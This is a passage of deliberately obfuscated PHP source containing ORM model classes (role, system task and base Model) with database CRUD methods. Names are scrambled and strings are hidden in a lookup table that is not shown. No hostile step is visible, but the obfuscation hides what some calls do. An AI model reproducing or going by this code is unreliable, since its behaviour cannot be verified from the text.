$­ôŠÄ®[$Š«»™Ü[1882]]); } $this->filterAuth($­ôŠÄ®[$Š«»™Ü[413]]); return parent::update($ÓÁ– Ï‹, $­ôŠÄ®); } public function remove($€‰ „Ô) { $÷¡™Ÿªğ = parent::listData($€‰ „Ô); if (!$÷¡™Ÿªğ || $÷¡™Ÿªğ[$_SERVER[ì™ı‰º¯][1283]]) { return !1; } return parent::remove($€‰ „Ô); } public function add($ÔÉ£…) { $‚¼ºó±° =& $_SERVER[ì™ı‰º¯]; $û ‡­ªÈ = $ÔÉ£…[$‚¼ºó±°[32]]; if ($this->findByName($û ‡­ªÈ)) { return !1; } $ÚòşŞÄ« = array($‚¼ºó±°[420] => $û ‡­ªÈ, $‚¼ºó±°[1865] => $‚¼ºó±°[12], $‚¼ºó±°[1861] => $‚¼ºó±°[1869], $‚¼ºó±°[2296] => 1, $‚¼ºó±°[1864] => 0, $‚¼ºó±°[2297] => 0, $‚¼ºó±°[1863] => $this->getSort()); $ÔÉ£… = array_merge($ÚòşŞÄ«, $ÔÉ£…); $this->filterAuth($ÔÉ£…[$‚¼ºó±°[413]]); return parent::insert($ÔÉ£…); } private function getSort() { $Áü•õµ =& $_SERVER[ì™ı‰º¯]; $şì•©îò = parent::listData(); $º‡Êà‹” = array_to_keyvalue($şì•©îò, $Áü•õµ[12], $Áü•õµ[1883]); return empty($º‡Êà‹”) ? 0 : max($º‡Êà‹”) + 1; } private function filterAuth(&$Æ²ñ˜üµ) { $°Ñİâ—° =& $_SERVER[ì™ı‰º¯]; $«ö­¯ß‹ = array(); $µ—ÍîÉ´ = array_filter(explode($°Ñİâ—°[50], $Æ²ñ˜üµ)); foreach ($µ—ÍîÉ´ as $Æ²ñ˜üµ) { $‡ß·³ÓÉ = explode($°Ñİâ—°[10], $Æ²ñ˜üµ); if ($‡ß·³ÓÉ[0] == $°Ñİâ—°[2298] && $‡ß·³ÓÉ[1] != $°Ñİâ—°[1189]) { $œ©ÎÍÁÙ = $‡ß·³ÓÉ[0] . $°Ñİâ—°[10] . $‡ß·³ÓÉ[1] . $°Ñİâ—°[2299]; if (!in_array($œ©ÎÍÁÙ, $µ—ÍîÉ´)) { $«ö­¯ß‹[] = $œ©ÎÍÁÙ; } } $«ö­¯ß‹[] = $Æ²ñ˜üµ; } $Æ²ñ˜üµ = implode($°Ñİâ—°[50], $«ö­¯ß‹); } public function findRoleDefault() { $ÛÜ¼©ğù =& $_SERVER[ì™ı‰º¯]; $âüÑ±Óè = parent::listData(); $Ü±½³¡ö = !1; foreach ($âüÑ±Óè as $ñÀúİÕ) { if (!$ñÀúİÕ || $ñÀúİÕ[$ÛÜ¼©ğù[1881]] == $ÛÜ¼©ğù[198] || $ñÀúİÕ[$ÛÜ¼©ğù[2061]] == 1) { continue; } if (strstr($ñÀúİÕ[$ÛÜ¼©ğù[413]], $ÛÜ¼©ğù[2300])) { continue; } if (!strstr($ñÀúİÕ[$ÛÜ¼©ğù[413]], $ÛÜ¼©ğù[2301])) { continue; } if (!$Ü±½³¡ö) { $Ü±½³¡ö = $ñÀúİÕ; continue; } $Ã­ÖèÂÕ = explode($ÛÜ¼©ğù[50], $Ü±½³¡ö[$ÛÜ¼©ğù[413]]); $ÃûôóÔü = explode($ÛÜ¼©ğù[50], $ñÀúİÕ[$ÛÜ¼©ğù[413]]); if (count($Ã­ÖèÂÕ) > count($ÃûôóÔü)) { $Ü±½³¡ö = $ñÀúİÕ; } } return $Ü±½³¡ö ? $Ü±½³¡ö[$ÛÜ¼©ğù[399]] : $ÛÜ¼©ğù[12]; } public function sort($ßèÉ»¡’, $ËìÉªº) { return parent::update($ßèÉ»¡’, $ËìÉªº); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x74\141\163\x6b\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x74\x79\x70\145", "\x65\x76\145\x6e\164", "\164\x69\155\145", "\x64\x65\163\x63", "\163\171\x73\164\145\x6d", "\x65\156\141\142\154\145", "\154\x61\163\x74\x52\165\156", "\163\157\x72\164"); public function listData($ãáªÔ = false, $‡¢ù·øø = "\163\157\162\x74", $êÚ÷Õ³ö = false) { return parent::listData($ãáªÔ, $‡¢ù·øø, $êÚ÷Õ³ö); } public function add($™øÒ“üÛ) { $÷•ÙÃş =& $_SERVER[ì™ı‰º¯]; $ÏÇ¬Ú‡Œ = $this->findByName($™øÒ“üÛ[$÷•ÙÃş[32]]); if ($ÏÇ¬Ú‡Œ) { return !1; } $™øÒ“üÛ[$÷•ÙÃş[1630]] = 0; $™øÒ“üÛ[$÷•ÙÃş[1883]] = $this->getSort(); return parent::insert($™øÒ“üÛ); } private function getSort() { $å…ü¨ =& $_SERVER[ì™ı‰º¯]; $ªŒÌ€§ = parent::listData(); $ÙÆãéÏ = array_to_keyvalue($ªŒÌ€§, $å…ü¨[12], $å…ü¨[1883]); return empty($ÙÆãéÏ) ? 0 : max($ÙÆãéÏ) + 1; } public function update($Ç¿úñı¤, $Î‰‘â®) { $­üœÉô¨ =& $_SERVER[ì™ı‰º¯]; $Íç®ÒëÔ = $this->listData($Ç¿úñı¤); $÷îïÇº’ = $this->findByName($Î‰‘â®[$­üœÉô¨[32]]); if (!$Íç®ÒëÔ || $÷îïÇº’ && $÷îïÇº’[$­üœÉô¨[399]] != $Íç®ÒëÔ[$­üœÉô¨[399]]) { return !1; } return parent::update($Ç¿úñı¤, $Î‰‘â®); } public function remove($„®Õ¾¸°, $½İÌäì = false) { $¶™í˜©½ =& $_SERVER[ì™ı‰º¯]; $¸ÑÒˆò = $this->listData($„®Õ¾¸°); if (!$¸ÑÒˆò) { return; } if (!$½İÌäì && $¸ÑÒˆò[$¶™í˜©½[1283]] == $¶™í˜©½[88]) { return !1; } return parent::remove($„®Õ¾¸°); } public function enable($¦êËö°, $ß„Ôø¨Î) { return $this->update($¦êËö°, array($_SERVER[ì™ı‰º¯][2290] => $ß„Ôø¨Î)); } public function run($ùü†„²ü) { return $this->update($ùü†„²ü, array($_SERVER[ì™ı‰º¯][2302] => time())); } } goto CÔï¬ØŠÉò; Cê¸Êá¸¶º: define($_SERVER[ì™ı‰º¯][238], 1); define($_SERVER[ì™ı‰º¯][239], 2); define($_SERVER[ì™ı‰º¯][240], 3); goto fŒÂ›„×²ß; BƒÌƒğÄâ“: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\157\162\144\145\x72", "\x61\154\151\x61\163", "\150\141\x76\x69\x6e\147", "\147\x72\157\165\x70", "\x6c\157\143\153", "\x64\x69\x73\164\x69\x6e\x63\x74", "\141\165\x74\x6f", "\x66\x69\154\164\x65\162", "\166\x61\x6c\x69\144\x61\164\145", "\x72\145\163\x75\x6c\x74", "\142\x69\x6e\144", "\164\157\x6b\x65\x6e"); public function __construct($Ì¥‹‘ç¨ = '', $á¬Ë¨ë€ = '', $áÑÌ‹µ‹ = '') { $Ö¯ñ×áñ =& $_SERVER[ì™ı‰º¯]; $this->_initialize(); if (!empty($Ì¥‹‘ç¨)) { if (strpos($Ì¥‹‘ç¨, $Ö¯ñ×áñ[10])) { list($this->dbName, $this->name) = explode($Ö¯ñ×áñ[10], $Ì¥‹‘ç¨); } else { $this->name = $Ì¥‹‘ç¨; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($á¬Ë¨ë€)) { $this->tablePrefix = $Ö¯ñ×áñ[12]; } elseif ($Ö¯ñ×áñ[12] != $á¬Ë¨ë€) { $this->tablePrefix = $á¬Ë¨ë€; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ö¯ñ×áñ[244]); } $this->db(0, empty($this->connection) ? $áÑÌ‹µ‹ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ëö­—ûÍ =& $_SERVER[ì™ı‰º¯]; if (empty($this->fields)) { if (think_config($ëö­—ûÍ[245])) { $ÀÕú·‰ = $this->dbName ? $this->dbName : think_config($ëö­—ûÍ[246]); $ôº§¼ş = think_var_cache($ëö­—ûÍ[247] . strtolower(get_path_this($ÀÕú·‰) . $ëö­—ûÍ[10] . $this->name)); if ($ôº§¼ş) { $¡¹Ú½ªæ = think_config($ëö­—ûÍ[248]); if (empty($¡¹Ú½ªæ) || $ôº§¼ş[$ëö­—ûÍ[249]] == $¡¹Ú½ªæ) { $this->fields = $ôº§¼ş; return; } } } $this->flush(); } } public function flush() { $Üœ²ªà  =& $_SERVER[ì™ı‰º¯]; $this->db->setModel($this->name); $€ÓÃ…Ñ = $this->db->getFields($this->getTableName()); if (!$€ÓÃ…Ñ) { return !1; } $this->fields = array_keys($€ÓÃ…Ñ); $this->fields[$Üœ²ªà [250]] = !1; foreach ($€ÓÃ…Ñ as $ˆêüüùÒ => $…Õ–Íåá) { $Ïø†Û˜õ[$ˆêüüùÒ] = $…Õ–Íåá[$Üœ²ªà [33]]; if ($…Õ–Íåá[$Üœ²ªà [39]]) { $this->fields[$Üœ²ªà [251]] = $ˆêüüùÒ; if ($…Õ–Íåá[$Üœ²ªà [42]]) { $this->fields[$Üœ²ªà [250]] = !0; } } } $this->fields[$Üœ²ªà [252]] = $Ïø†Û˜õ; if (think_config($Üœ²ªà [248])) { $this->fields[$Üœ²ªà [249]] = think_config($Üœ²ªà [248]); } if (think_config($Üœ²ªà [245])) { $«¿±ßÃ = $this->dbName ? $this->dbName : think_config($Üœ²ªà [246]); think_var_cache($Üœ²ªà [247] . strtolower(get_path_this($«¿±ßÃ) . $Üœ²ªà [10] . $this->name), $this->fields); } } public function switchModel($İ©ÙØÖˆ, $šÆŒ£Ş¿ = array()) { $©¯ÍÏ€Ì =& $_SERVER[ì™ı‰º¯]; $¯–‚îöÄ = ucwords(strtolower($İ©ÙØÖˆ)) . $©¯ÍÏ€Ì[253]; if (!class_exists($¯–‚îöÄ)) { think_exception($¯–‚îöÄ . think_lang($©¯ÍÏ€Ì[254])); } $this->_extModel = new $¯–‚îöÄ($this->name); if (!empty($šÆŒ£Ş¿)) { foreach ($šÆŒ£Ş¿ as $ˆ¾¡³ÓŞ) { $this->_extModel->setProperty($ˆ¾¡³ÓŞ, $this->{$ˆ¾¡³ÓŞ}); } } return $this->_extModel; } public function __set($®òÚ‹šª, $èé÷ä‹ƒ) { $this->data[$®òÚ‹šª] = $èé÷ä‹ƒ; } public function __get($óŞ‚õÚÀ) { return isset($this->data[$óŞ‚õÚÀ]) ? $this->data[$óŞ‚õÚÀ] : null; } public function __isset($øò·½õ¡) { return isset($this->data[$øò·½õ¡]); } public function __unset($ğ¥’ˆÖİ) { unset($this->data[$ğ¥’ˆÖİ]); } public function __call($ËÕË»œ, $û¨¦–˜¾) { $˜™ŸÔĞú =& $_SERVER[ì™ı‰º¯]; if (in_array(strtolower($ËÕË»œ), $this->methods, !0)) { $this->options[strtolower($ËÕË»œ)] = $û¨¦–˜¾[0]; return $this; } elseif (in_array(strtolower($ËÕË»œ), array($˜™ŸÔĞú[255], $˜™ŸÔĞú[256], $˜™ŸÔĞú[257], $˜™ŸÔĞú[258], $˜™ŸÔĞú[259]), !0)) { $Ù˜²êÉ™ = isset($û¨¦–˜¾[0]) ? $û¨¦–˜¾[0] : $˜™ŸÔĞú[189]; $Ù˜²êÉ™ = $this->db->parseKey($Ù˜²êÉ™); return $this->getField(strtoupper($ËÕË»œ) . $˜™ŸÔĞú[260] . $Ù˜²êÉ™ . $˜™ŸÔĞú[261] . $ËÕË»œ, $˜™ŸÔĞú[255]); } elseif (strtolower(substr($ËÕË»œ, 0, 5)) == $˜™ŸÔĞú[262]) { $Ù˜²êÉ™ = think_parse_name(substr($ËÕË»œ, 5)); $Óâ â¦[$Ù˜²êÉ™] = $û¨¦–˜¾[0]; return $this->where($Óâ â¦)->find(); } elseif (strtolower(substr($ËÕË»œ, 0, 10)) == $˜™ŸÔĞú[263]) { $ìøşˆ‰î = think_parse_name(substr($ËÕË»œ, 10)); $Óâ â¦[$ìøşˆ‰î] = $û¨¦–˜¾[0]; return $this->where($Óâ â¦)->getField($û¨¦–˜¾[1]); } elseif (isset($this->_scope[$ËÕË»œ])) { return $this->scope($ËÕË»œ, $û¨¦–˜¾[0]); } elseif (method_exists($this, $ËÕË»œ)) { array_unshift($û¨¦–˜¾, $ËÕË»œ); return call_user_func_array(array($this, $˜™ŸÔĞú[264]), $û¨¦–˜¾); } else { return call_user_func_array(array(parent, $ËÕË»œ), $û¨¦–˜¾); } } protected function call() { $¹Éó–•Ï =& $_SERVER[ì™ı‰º¯]; $êºì«¤ = func_get_args(); $¶Ø†œ›¤ = array_shift($êºì«¤); $œÒÎ“® = $¶Ø†œ›¤; if (is_array($¶Ø†œ›¤)) { $œÒÎ“® = $¶Ø†œ›¤[1]; $¶Ø†œ›¤ = $¶Ø†œ›¤[0]; } $„‰ˆ…Ù§ = count($êºì«¤) - 1; if (isset($êºì«¤[$„‰ˆ…Ù§]) && $êºì«¤[$„‰ˆ…Ù§] === $¶Ø†œ›¤) { think_exception(__CLASS__ . $¹Éó–•Ï[4] . $¶Ø†œ›¤ . think_lang($¹Éó–•Ï[265])); return; } $êºì«¤[] = $¶Ø†œ›¤; if (method_exists($this, $¹Éó–•Ï[266])) { $‰ÕñÈô = call_user_func_array(array($this, $¹Éó–•Ï[267]), array($œÒÎ“®, $êºì«¤)); if (!is_null($‰ÕñÈô) && $‰ÕñÈô !== !1) { return $‰ÕñÈô; } } $íé¦¶Ÿî = call_user_func_array(array($this, $¶Ø†œ›¤), $êºì«¤); if (method_exists($this, $¹Éó–•Ï[268])) { $‰ÕñÈô = call_user_func_array(array($this, $¹Éó–•Ï[269]), array($œÒÎ“®, $êºì«¤, $íé¦¶Ÿî)); if ($‰ÕñÈô) { return $‰ÕñÈô; } } return $íé¦¶Ÿî; } protected function _initialize() { } protected function _facade($Éòçï³) { $Ç¶êÀÚÖ =& $_SERVER[ì™ı‰º¯]; if (!empty($this->fields)) { foreach ($Éòçï³ as $æ‘³ÖÒÍ => $ßƒ¦æßã) { if (is_array($this->fields) && !in_array($æ‘³ÖÒÍ, $this->fields, !0)) { unset($Éòçï³[$æ‘³ÖÒÍ]); } elseif (is_scalar($ßƒ¦æßã)) { $this->_parseType($Éòçï³, $æ‘³ÖÒÍ); } } } if (!empty($this->options[$Ç¶êÀÚÖ[270]])) { $Éòçï³ = array_map($this->options[$Ç¶êÀÚÖ[270]], $Éòçï³); unset($this->options[$Ç¶êÀÚÖ[270]]); } $this->_beforeWrite($Éòçï³); return $Éòçï³; } protected function _beforeWrite(&$Å¦ï™ª) { } public function add($Áã¨˜ı“ = '', $ÅïŒó„­ = array(), $ÆñîìˆĞ = false) { if (empty($Áã¨˜ı“)) { if (!empty($this->data)) { $Áã¨˜ı“ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ì™ı‰º¯][271]); return !1; } } $ÅïŒó„­ = $this->_parseOptions($ÅïŒó„­); $Áã¨˜ı“ = $this->_facade($Áã¨˜ı“); if (!1 === $this->_beforeInsert($Áã¨˜ı“, $ÅïŒó„­)) { return !1; } $¤îü»½ = $this->db->insert($Áã¨˜ı“, $ÅïŒó„­, $ÆñîìˆĞ); if (!1 !== $¤îü»½) { $å’Œ™Ü = $this->getLastInsID(); if ($å’Œ™Ü) { $Áã¨˜ı“[$this->getPk()] = $å’Œ™Ü; $this->_after_insert($Áã¨˜ı“, $ÅïŒó„­); return $å’Œ™Ü; } $this->_after_insert($Áã¨˜ı“, $ÅïŒó„­); } return $¤îü»½; } protected function _beforeInsert(&$è¸®Úé, $•òö÷ò) { } protected function _after_insert($¸›Ãİâ, $êÈÒÇ€û) { } public function addAll($ã»íÉ»Î, $à—„Ñ = array(), $­†ÉÌ¥¥ = false) { $ÊíÂı¢ =& $_SERVER[ì™ı‰º¯]; if (empty($ã»íÉ»Î)) { $this->error = think_lang($ÊíÂı¢[271]); return !1; } $à—„Ñ = $this->_parseOptions($à—„Ñ); foreach ($ã»íÉ»Î as $†í½ÉèÀ => $öïé–óœ) { $ã»íÉ»Î[$†í½ÉèÀ] = $this->_facade($öïé–óœ); } if (method_exists($this->db, $ÊíÂı¢[272])) { $İòÅ¡±Œ = $this->db->insertAll($ã»íÉ»Î, $à—„Ñ, $­†ÉÌ¥¥); } else { $this->startTrans(); foreach ($ã»íÉ»Î as $†í½ÉèÀ => $öïé–óœ) { $İòÅ¡±Œ = $this->db->insert($öïé–óœ, $à—„Ñ, $­†ÉÌ¥¥); } $this->commit(); } if (!1 !== $İòÅ¡±Œ) { $Å¯Ã‰…´ = $this->getLastInsID(); if ($Å¯Ã‰…´) { return $Å¯Ã‰…´; } } return $İòÅ¡±Œ; } public function selectAdd($ıŠ Ó×ı = '', $±ğ™­Ï = '', $ÑÃ«ô­Ô = array()) { $Éâ—€œä =& $_SERVER[ì™ı‰º¯]; $ÑÃ«ô­Ô = $this->_parseOptions($ÑÃ«ô­Ô); if (!1 === ($úüÊ¯­— = $this->db->selectInsert($ıŠ Ó×ı ? $ıŠ Ó×ı : $ÑÃ«ô­Ô[$Éâ—€œä[273]], $±ğ™­Ï ? $±ğ™­Ï : $this->getTableName(), $ÑÃ«ô­Ô))) { $this->error = think_lang($Éâ—€œä[274]); return !1; } else { return $úüÊ¯­—; } } public function save($—º»„ê = '', $´™£¦ëÆ = array()) { $€–¶Ö =& $_SERVER[ì™ı‰º¯]; if (empty($—º»„ê)) { if (!empty($this->data)) { $—º»„ê = $this->data; $this->data = array(); } else { $this->error = think_lang($€–¶Ö[271]); return !1; } } $—º»„ê = $this->_facade($—º»„ê); $´™£¦ëÆ = $this->_parseOptions($´™£¦ëÆ); $·¼ôÆÊš = $this->getPk(); if (!isset($´™£¦ëÆ[$€–¶Ö[275]])) { if (isset($—º»„ê[$·¼ôÆÊš])) { $Çˆº­µß[$·¼ôÆÊš] = $—º»„ê[$·¼ôÆÊš]; $´™£¦ëÆ[$€–¶Ö[275]] = $Çˆº­µß; unset($—º»„ê[$·¼ôÆÊš]); } else { $this->error = think_lang($€–¶Ö[274]); return !1; } } if (is_array($´™£¦ëÆ[$€–¶Ö[275]]) && isset($´™£¦ëÆ[$€–¶Ö[275]][$·¼ôÆÊš])) { $ëİ°”º = $´™£¦ëÆ[$€–¶Ö[275]][$·¼ôÆÊš]; } if (!1 === $this->_beforeUpdate($—º»„ê, $´™£¦ëÆ)) { return !1; } $Èú¢ = $this->db->update($—º»„ê, $´™£¦ëÆ); if (!1 !== $Èú¢) { if (isset($ëİ°”º)) { $—º»„ê[$·¼ôÆÊš] = $ëİ°”º; } $this->_afterUpdate($—º»„ê, $´™£¦ëÆ); } return $Èú¢; } protected function _beforeUpdate(&$ƒÊÌü–§, $Ç¶Öõö¦) { } protected function _afterUpdate($³³íÃİ», $şÈ²Ó•ê) { } public function delete($Ç¬‡ –ë = array()) { $úÀÖ”óù =& $_SERVER[ì™ı‰º¯]; if (empty($Ç¬‡ –ë) && empty($this->options[$úÀÖ”óù[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $—‡£–ˆ = $this->getPk(); if (is_numeric($Ç¬‡ –ë) || is_string($Ç¬‡ –ë)) { if (strpos($Ç¬‡ –ë, $úÀÖ”óù[50])) { $æìÏ¼Šˆ[$—‡£–ˆ] = array($úÀÖ”óù[276], $Ç¬‡ –ë); } else { $æìÏ¼Šˆ[$—‡£–ˆ] = $Ç¬‡ –ë; } $this->options[$úÀÖ”óù[275]] = $æìÏ¼Šˆ; } $Ç¬‡ –ë = $this->_parseOptions(); if (is_array($Ç¬‡ –ë[$úÀÖ”óù[275]]) && isset($Ç¬‡ –ë[$úÀÖ”óù[275]][$—‡£–ˆ])) { $ÙÎøØŞõ = $Ç¬‡ –ë[$úÀÖ”óù[275]][$—‡£–ˆ]; } $î‡í Ûá = $this->db->delete($Ç¬‡ –ë); if (!1 !== $î‡í Ûá) { $öí—Óƒğ = array(); if (isset($ÙÎøØŞõ)) { $öí—Óƒğ[$—‡£–ˆ] = $ÙÎøØŞõ; } $this->_after_delete($öí—Óƒğ, $Ç¬‡ –ë); } return $î‡í Ûá; } protected function _after_delete($èß¤—Ü“, $Ìì‡—³») { } public function select($’³Èœ†‡ = array()) { $§Ì…Ş¸Ë =& $_SERVER[ì™ı‰º¯]; if (is_string($’³Èœ†‡) || is_numeric($’³Èœ†‡)) { $õÉˆÀŠƒ = $this->getPk(); if (strpos($’³Èœ†‡, $§Ì…Ş¸Ë[50])) { $ğè¹ïè™[$õÉˆÀŠƒ] = array($§Ì…Ş¸Ë[276], $’³Èœ†‡); } else { $ğè¹ïè™[$õÉˆÀŠƒ] = $’³Èœ†‡; } $this->options[$§Ì…Ş¸Ë[275]] = $ğè¹ïè™; } elseif (!1 === $’³Èœ†‡) { $’³Èœ†‡ = $this->_parseOptions(); return $§Ì…Ş¸Ë[277] . $this->db->buildSelectSql($’³Èœ†‡) . $§Ì…Ş¸Ë[278]; } $’³Èœ†‡ = $this->_parseOptions(); $çÓÑØ”Ê = $this->db->select($’³Èœ†‡); if (!1 === $çÓÑØ”Ê) { return !1; } if (empty($çÓÑØ”Ê)) { return null; } $this->_afterSelect($çÓÑØ”Ê, $’³Èœ†‡); return $çÓÑØ”Ê; } protected function _afterSelect(&$‹Œó¶¶, $ÂÖä„Ğˆ) { } public function buildSql($×åøØÁÏ = array()) { $¶ì©âØÉ =& $_SERVER[ì™ı‰º¯]; $×åøØÁÏ = $this->_parseOptions($×åøØÁÏ); return $¶ì©âØÉ[277] . $this->db->buildSelectSql($×åøØÁÏ) . $¶ì©âØÉ[278]; } public function optionsValue($¹§Ê½ÎÒ = null) { if (is_null($¹§Ê½ÎÒ)) { return $this->options; } elseif (is_array($¹§Ê½ÎÒ)) { $this->options = array_merge($this->options, $¹§Ê½ÎÒ); } } protected function _parseOptions($ÊÊÕ¬ş = array()) { $´ÊŒ¤À² =& $_SERVER[ì™ı‰º¯]; if (is_array($ÊÊÕ¬ş)) { $ÊÊÕ¬ş = array_merge($this->options, $ÊÊÕ¬ş); } $this->options = array(); if (!isset($ÊÊÕ¬ş[$´ÊŒ¤À²[279]])) { $ÊÊÕ¬ş[$´ÊŒ¤À²[279]] = $this->getTableName(); $Ô£‘ï“ = $this->fields; } else { $Ô£‘ï“ = $this->getDbFields(); } if (!empty($ÊÊÕ¬ş[$´ÊŒ¤À²[280]])) { $ÊÊÕ¬ş[$´ÊŒ¤À²[279]] .= $´ÊŒ¤À²[53] . $ÊÊÕ¬ş[$´ÊŒ¤À²[280]]; } $ÊÊÕ¬ş[$´ÊŒ¤À²[281]] = $this->name; if (isset($ÊÊÕ¬ş[$´ÊŒ¤À²[275]]) && is_array($ÊÊÕ¬ş[$´ÊŒ¤À²[275]]) && !empty($Ô£‘ï“) && !isset($ÊÊÕ¬ş[$´ÊŒ¤À²[282]]) && !isset($ÊÊÕ¬ş[$´ÊŒ¤À²[279]])) { foreach ($ÊÊÕ¬ş[$´ÊŒ¤À²[275]] as $Æßé‹¿ => $‡Ö’öŸ) { $Æßé‹¿ = trim($Æßé‹¿); if (in_array($Æßé‹¿, $Ô£‘ï“, !0)) { if (is_scalar($‡Ö’öŸ)) { $this->_parseType($ÊÊÕ¬ş[$´ÊŒ¤À²[275]], $Æßé‹¿); } } elseif (!is_numeric($Æßé‹¿) && $´ÊŒ¤À²[11] != substr($Æßé‹¿, 0, 1) && !1 === strpos($Æßé‹¿, $´ÊŒ¤À²[10]) && !1 === strpos($Æßé‹¿, $´ÊŒ¤À²[260]) && !1 === strpos($Æßé‹¿, $´ÊŒ¤À²[283]) && !1 === strpos($Æßé‹¿, $´ÊŒ¤À²[284])) { unset($ÊÊÕ¬ş[$´ÊŒ¤À²[275]][$Æßé‹¿]); } } } $this->_options_filter($ÊÊÕ¬ş); return $ÊÊÕ¬ş; } protected function _options_filter(&$Ğò¸­¢£) { } protected function _parseType(&$œÅÇ…Ø, $ô¹õ‹Ù¡) { $—•¹„ò€ =& $_SERVER[ì™ı‰º¯]; if (empty($this->options[$—•¹„ò€[285]][$—•¹„ò€[4] . $ô¹õ‹Ù¡])) { $®ÚŠŠŸ = strtolower($this->fields[$—•¹„ò€[252]][$ô¹õ‹Ù¡]); if (!1 !== strpos($®ÚŠŠŸ, $—•¹„ò€[286])) { } elseif (!1 === strpos($®ÚŠŠŸ, $—•¹„ò€[287]) && !1 !== strpos($®ÚŠŠŸ, $—•¹„ò€[288])) { $œÅÇ…Ø[$ô¹õ‹Ù¡] = intval($œÅÇ…Ø[$ô¹õ‹Ù¡]); } elseif (!1 !== strpos($®ÚŠŠŸ, $—•¹„ò€[289]) || !1 !== strpos($®ÚŠŠŸ, $—•¹„ò€[290])) { $œÅÇ…Ø[$ô¹õ‹Ù¡] = floatval($œÅÇ…Ø[$ô¹õ‹Ù¡]); } elseif (!1 !== strpos($®ÚŠŠŸ, $—•¹„ò€[291])) { $œÅÇ…Ø[$ô¹õ‹Ù¡] = (bool) $œÅÇ…Ø[$ô¹õ‹Ù¡]; } } } public function find($‚Ó´Ãùé = array()) { $§§œÌëÉ =& $_SERVER[ì™ı‰º¯]; if (is_numeric($‚Ó´Ãùé) || is_string($‚Ó´Ãùé)) { $µß×€Ò¡[$this->getPk()] = intval($‚Ó´Ãùé); $this->options[$§§œÌëÉ[275]] = $µß×€Ò¡; } $this->options[$§§œÌëÉ[292]] = 1; $‚Ó´Ãùé = $this->_parseOptions(); $¤¥½¾ŒÀ = $this->db->select($‚Ó´Ãùé); if (!1 === $¤¥½¾ŒÀ) { return !1; } if (empty($¤¥½¾ŒÀ)) { return null; } $this->data = $¤¥½¾ŒÀ[0]; $this->_afterFind($this->data, $‚Ó´Ãùé); if (!empty($this->options[$§§œÌëÉ[293]])) { return $this->returnResult($this->data, $this->options[$§§œÌëÉ[293]]); } return $this->data; } protected function _afterFind(&$‡áğ‹ª, $ÇåàÏ‚Ö) { } protected function returnResult($üÊØ·ƒ», $Èü´‚¥² = '') { $˜€ì«Ü¿ =& $_SERVER[ì™ı‰º¯]; if ($Èü´‚¥²) { if (is_callable($Èü´‚¥²)) { return call_user_func($Èü´‚¥², $üÊØ·ƒ»); } switch (strtolower($Èü´‚¥²)) { case $˜€ì«Ü¿[294]: return json_encode($üÊØ·ƒ»); case $˜€ì«Ü¿[295]: return xml_encode($üÊØ·ƒ»); } } return $üÊØ·ƒ»; } public function parseFieldsMap($ŸÉãµë, $‚íöôÊÓ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ó ¸¾–à => $Ö Ë´Õª) { if ($‚íöôÊÓ == 1) { if (isset($ŸÉãµë[$Ö Ë´Õª])) { $ŸÉãµë[$Ó ¸¾–à] = $ŸÉãµë[$Ö Ë´Õª]; unset($ŸÉãµë[$Ö Ë´Õª]); } } else { if (isset($ŸÉãµë[$Ó ¸¾–à])) { $ŸÉãµë[$Ö Ë´Õª] = $ŸÉãµë[$Ó ¸¾–à]; unset($ŸÉãµë[$Ó ¸¾–à]); } } } } return $ŸÉãµë; } public function setField($æ·›ô¥ó, $é£œ³æ = '') { if (is_array($æ·›ô¥ó)) { $Ê’ô˜«£ = $æ·›ô¥ó; } else { $Ê’ô˜«£[$æ·›ô¥ó] = $é£œ³æ; } return $this->save($Ê’ô˜«£); } public function setAdd($ÃÔôÒ±ñ, $ã±Ëšæß = 1) { $¡í¦´×» =& $_SERVER[ì™ı‰º¯]; $ÓÕÀÎğ« = $ÃÔôÒ±ñ . $¡í¦´×»[296] . $ã±Ëšæß; if ($ã±Ëšæß < 0) { $ÓÕÀÎğ« = $ÃÔôÒ±ñ . $ã±Ëšæß; } return $this->setField($ÃÔôÒ±ñ, array($¡í¦´×»[297], $ÓÕÀÎğ«)); } public function getField($í‡Î¹©ı, $Ä´‘š = null) { $èæá¢Æø =& $_SERVER[ì™ı‰º¯]; $ù™½ÃÉÇ[$èæá¢Æø[273]] = $í‡Î¹©ı; $ù™½ÃÉÇ = $this->_parseOptions($ù™½ÃÉÇ); $í‡Î¹©ı = trim($í‡Î¹©ı); if (strpos($í‡Î¹©ı, $èæá¢Æø[50])) { if (!isset($ù™½ÃÉÇ[$èæá¢Æø[292]])) { $ù™½ÃÉÇ[$èæá¢Æø[292]] = is_numeric($Ä´‘š) ? $Ä´‘š : $èæá¢Æø[12]; } $â· Ÿƒ• = $this->db->select($ù™½ÃÉÇ); if (!empty($â· Ÿƒ•)) { $úñ”Èº† = explode($èæá¢Æø[50], $í‡Î¹©ı); $í‡Î¹©ı = array_keys($â· Ÿƒ•[0]); $£É¸éÂ‰ = array_shift($í‡Î¹©ı); $û¡Ÿäş = array_shift($í‡Î¹©ı); $’Ÿù¨ÎÚ = array(); $ÕİŒ–Øó = count($úñ”Èº†); foreach ($â· Ÿƒ• as $œŸı…¿¸) { $åÔå®À° = $œŸı…¿¸[$£É¸éÂ‰]; if (2 == $ÕİŒ–Øó) { $’Ÿù¨ÎÚ[$åÔå®À°] = $œŸı…¿¸[$û¡Ÿäş]; } else { $’Ÿù¨ÎÚ[$åÔå®À°] = is_string($Ä´‘š) ? implode($Ä´‘š, $œŸı…¿¸) : $œŸı…¿¸; } } return $’Ÿù¨ÎÚ; } } else { if (!0 !== $Ä´‘š) { $ù™½ÃÉÇ[$èæá¢Æø[292]] = is_numeric($Ä´‘š) ? $Ä´‘š : 1; } if 